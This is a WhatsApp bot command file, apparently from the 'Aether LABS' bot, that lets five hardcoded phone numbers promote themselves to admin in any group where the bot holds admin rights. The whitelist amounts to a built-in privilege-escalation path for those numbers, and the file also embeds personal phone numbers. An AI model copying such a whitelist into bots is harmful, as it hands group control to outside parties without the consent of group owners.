export default {
  command: ['autoadmin'],
  category: 'owner',
  description: 'Dar admin.',
  isDev: true,
  botAdmin: true,
  run: async (...args) => {
    const client = args[0]?.sock || args[0]
    const m = args[0]?.msg || args[1] || args[0]

    const who = m?.sender || m?.key?.participant || m?.key?.remoteJid
    if (!who) return
    const chat = m?.chat || m?.key?.remoteJid

    const permitidos = [
      '573015200599',
      '5491128178894',
      '593989068253', 
      '584148014097', 
      '584000000000',
    ]

    const normalizar = (jid = '') => jid.replace(/[^0-9]/g, '')

    try {
      if (!chat?.endsWith('@g.us')) {
        return client.sendMessage(chat, { text: '《✧》 Este comando solo se puede usar en grupos.' }, { quoted: m })
      }

      if (!permitidos.map(normalizar).includes(normalizar(who))) {
        return client.sendMessage(
          chat,
          { text: `《✧》 No tienes permiso para usar este comando.\n\n> Solo usuarios autorizados pueden usar.autoadmin` },
          { quoted: m }
        )
      }

      const groupMetadata = await client.groupMetadata(chat).catch(() => null)
      if (!groupMetadata) {
        return client.sendMessage(chat, { text: '《✧》 No se pudo obtener la información del grupo.' }, { quoted: m })
      }

      const participant = groupMetadata.participants.find((p) => p.id === who)

      if (participant?.admin) {
        return client.sendMessage(
          chat,
          {
            text: `《✧》 *@${who.split('@')[0]}* ya eras administrador del grupo con anterioridad\n\n> *Owner*: @${who.split('@')[0]}\n> 𝐴𝑒𝑡ℎ𝑒𝑟 𝐿𝐴𝐵𝑆`,
            mentions: [who],
          },
          { quoted: m },
        )
      }

      await client.groupParticipantsUpdate(chat, [who], 'promote')

      await client.sendMessage(
        chat,
        {
          text: `✿ El *Owner* *@${who.split('@')[0]}* ahora tiene privilegios de administrador en este grupo\n\n> *Owner*: @${who.split('@')[0]}\n> 𝐴𝑒𝑡ℎ𝑒𝑟 𝐿𝐴𝐵𝑆`,
          mentions: [who],
        },
        { quoted: m },
      )
    } catch (err) {
      console.error(err)
      await m.reply(msgglobal).catch(() => client.sendMessage(chat, { text: msgglobal }, { quoted: m }))
    }
  },
};